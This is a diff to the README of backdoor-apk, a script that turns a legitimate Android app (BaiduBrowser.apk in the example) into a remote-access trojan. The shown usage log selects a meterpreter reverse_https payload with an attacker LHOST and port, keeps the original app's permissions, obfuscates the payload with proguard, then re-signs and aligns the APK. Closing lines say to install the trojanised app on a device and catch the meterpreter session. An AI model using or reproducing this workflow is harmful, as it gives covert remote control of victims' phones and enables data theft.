@@ -4,7 +4,7 @@ backdoor-apk is a shell script that simplifies the process of adding a backdoor 
 Usage:
 
 ```
-root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk
+root@kali:~/Code/github/backdoor-apk/backdoor-apk# ./backdoor-apk.sh BaiduBrowser.apk 
           ________
          / ______ \
          || _  _ ||
@@ -19,7 +19,7 @@ ________|__________|__________________________________________
        /____________\
        |____________|            Dana James Traversie
 
-[*] Running backdoor-apk.sh v0.2.2 on Fri Mar 31 22:30:34 EST 2017
+[*] Running backdoor-apk.sh v0.2.3 on Mon Oct  9 16:50:06 EDT 2017
 [+] Android payload options:
 1) meterpreter/reverse_http   4) shell/reverse_http
 2) meterpreter/reverse_https  5) shell/reverse_https
@@ -27,11 +27,14 @@ ________|__________|__________________________________________
 [?] Please select an Android payload option: 2
 [?] Please enter an LHOST value: 10.6.9.31
 [?] Please enter an LPORT value: 443
+[+] Android manifest permission options:
+1) Keep original
+2) Merge with payload and shuffle
+[?] Please select an Android manifest permission option: 1
 [+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc
 [*] Generating RAT APK file...done.
-[*] Decompiling RAT APK file...done.
 [*] Decompiling original APK file...done.
-[*] Merging permissions of original and payload projects...done.
+[+] Keeping permissions of original project
 [*] Running proguard on RAT APK file...done.
 [*] Decompiling obfuscated RAT APK file...done.
 [*] Creating new directories in original project for RAT smali files...done.
@@ -46,7 +49,7 @@ ________|__________|__________________________________________
 [*] Signing recompiled APK...done.
 [*] Verifying signed artifacts...done.
 [*] Aligning recompiled APK...done.
-root@kali:~/Android/evol-lab/BaiduBrowserRat#
+root@kali:~/Code/github/backdoor-apk/backdoor-apk#
 ```
 
 The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection via the generated resource script: msfconsole -r backdoor-apk.rc
